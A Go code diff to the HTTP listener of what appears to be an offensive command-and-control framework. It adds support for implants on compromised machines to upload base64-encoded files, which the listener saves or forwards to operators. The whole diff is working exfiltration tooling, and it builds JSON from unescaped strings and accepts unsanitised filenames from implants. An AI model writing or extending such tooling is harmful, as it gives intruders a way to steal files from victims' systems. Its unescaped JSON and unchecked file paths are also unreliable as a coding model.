@@ -5,6 +5,7 @@ import (
 	"errors"
 	"fmt"
 	"net/http"
+	"net/url"
 	"strconv"
 
 	"github.com/google/uuid"
@@ -55,6 +56,10 @@ func HTTPServerHandler(w http.ResponseWriter, r *http.Request) {
 // Username - a username provided so the handler knows who the request is destined for, defaults to "server" if the implant does not specify in the request.
 //
 // Register - a boolean value that lets a listener know if an implant is attempting to register itself or not. If not provided registration is assumed to be false. If registration is attempted the listener will check for valid authentication via the PSK and attempt to register a new session.
+//
+// FileName - a string value provided by an implant that is the filename for a file being sent to download.
+//
+// File - a string value that is expected to be a base64 encoded string that is a file
 
 func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 
@@ -70,6 +75,8 @@ func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 	var additionalFunctions map[string]interface{}
 	var getUsername string
 	register := false
+	var getFileName string
+	var getFile string
 	var err error
 
 	// Get the Remote Address of the Implant from the request
@@ -162,6 +169,14 @@ func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 		getUsername = "server"
 	}
 
+	if len(getParams["filename"]) > 0 {
+		getFileName = getParams["filename"][0]
+	}
+
+	if len(getParams["file"]) > 0 {
+		getFile = getParams["file"][0]
+	}
+
 	if getPSK == PSK {
 
 		if register == true {
@@ -206,8 +221,29 @@ func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 			fmt.Println("\nSession " + strconv.Itoa(getSessionID) + " returned:\n" + getData)
 		} else {
 			currentWolf := core.Wolves[getUsername]
-			jsonData := `{"data":"` + getData + `"}`
+			data, err := url.QueryUnescape(getData)
+			if err != nil {
+				core.LogData("Session " + strconv.Itoa(getSessionID) + " error: could not escape data returned by client")
+			}
+			jsonData := `{"data":"` + data + `"}`
 			core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
+		}
+	}
+
+	if getFileName != "" {
+		core.LogData("Session " + strconv.Itoa(getSessionID) + " returned the file: " + getFileName)
+
+		if getFile == "" {
+			core.LogData("Session " + strconv.Itoa(getSessionID) + " file contents was empty, no file written for: " + getFileName)
+			fmt.Println("\nSession " + strconv.Itoa(getSessionID) + " file contents was empty, no file written for: " + getFileName)
+		} else {
+			if getUsername == "server" {
+				core.DownloadFile(getFileName, getFile)
+			} else {
+				currentWolf := core.Wolves[getUsername]
+				jsonData := `{"filename":"` + getFileName + `"` + `,"file":"` + getFile + `"}`
+				core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
+			}
 		}
 	}
 
@@ -254,6 +290,10 @@ func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 // Username - a username provided so the handler knows who the request is destined for, defaults to "server" if the implant does not specify in the request.
 //
 // Register - a boolean value that lets a listener know if an implant is attempting to register itself or not. If not provided registration is assumed to be false. If registration is attempted the listener will check for valid authentication via the PSK and attempt to register a new session.
+//
+// FileName - a string value provided by an implant that is the filename for a file being sent to download.
+//
+// File - a string value that is expected to be a base64 encoded string that is a file
 
 func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 	r.ParseForm()
@@ -269,6 +309,8 @@ func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 	var additionalFunctions map[string]interface{}
 	var postUsername string
 	register := false
+	var postFileName string
+	var postFile string
 	var err error
 
 	// Get the Remote Address of the Implant from the request
@@ -360,6 +402,14 @@ func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 		postUsername = "server"
 	}
 
+	if len(postParams["filename"]) > 0 {
+		postFileName = postParams["filename"][0]
+	}
+
+	if len(postParams["file"]) > 0 {
+		postFile = postParams["file"][0]
+	}
+
 	if postPSK == PSK {
 
 		if register == true {
@@ -406,6 +456,23 @@ func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 			currentWolf := core.Wolves[postUsername]
 			jsonData := `{"data":"` + postData + `"}`
 			core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
+		}
+	}
+
+	if postFileName != "" {
+		core.LogData("Session " + strconv.Itoa(postSessionID) + " returned the file: " + postFileName)
+
+		if postFile == "" {
+			core.LogData("Session " + strconv.Itoa(postSessionID) + " file contents was empty, no file written for: " + postFileName)
+			fmt.Println("\nSession " + strconv.Itoa(postSessionID) + " file contents was empty, no file written for: " + postFileName)
+		} else {
+			if postUsername == "server" {
+				core.DownloadFile(postFileName, postFile)
+			} else {
+				currentWolf := core.Wolves[postUsername]
+				jsonData := `{"filename":"` + postFileName + `"` + `,"file":"` + postFile + `"}`
+				core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
+			}
 		}
 	}
 
